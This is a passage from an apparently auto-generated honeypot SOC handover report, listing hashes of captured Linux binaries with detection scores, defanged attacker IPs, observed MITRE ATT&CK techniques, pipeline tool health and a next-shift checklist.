| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `162.243.208[.]127` | US | DigitalOcean, LLC | **100** ⚠️ | 27 |
| `211.47.126[.]146` | KR | kt HCN Co.,Ltd. | **100** ⚠️ | 28 |
| `3.134.216[.]108` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `185.242.226[.]19` | NL | HostUS Solutions LLC | **100** ⚠️ | 50 |
| `8.213.215[.]131` | TH | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 16 |
| `34.122.129[.]31` | US | Google LLC | **100** ⚠️ | 50 |
| `180.184.141[.]117` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `150.246.249[.]149` | JP | So-net Service | **100** ⚠️ | 50 |
| `117.242.152[.]161` | IN | NIB (National Internet Backbone) | **100** ⚠️ | 0 |
| `59.103.104[.]66` | PK | Cyber Internet Services Pvt Ltd | **85** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 27 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 14 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 76 cases |
| Tool 34  | Credential Extractor        | ✅ 24 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 13 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (14.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 13 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 11 priority case(s) shown individually · 11 recon entry/entries in table (4 group(s) consolidating 47 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-08T05:46:33Z_
